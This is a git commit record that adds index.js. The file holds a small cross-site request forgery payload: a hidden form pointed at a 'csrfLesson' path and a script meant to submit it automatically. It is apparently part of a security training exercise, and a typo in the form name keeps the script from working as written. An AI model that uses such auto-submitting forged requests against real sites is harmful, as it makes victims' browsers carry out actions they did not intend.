c052b2b02886d1850de543f72595a2ea9709f237
DevinOM <devinmadr210@gmail.com>
2022-02-06 18:58:36 -0600

    update

---
+++ index.js
@@ -0,0 +1,6 @@
+<form name="csrfForm" action="/root/grantComplete/csrfLesson" method="GET">
+  <input type="hidden" name="userId" value="2036302190 " />
+</form>
+<script>
+  document.scrfForm.submit();
+</script>
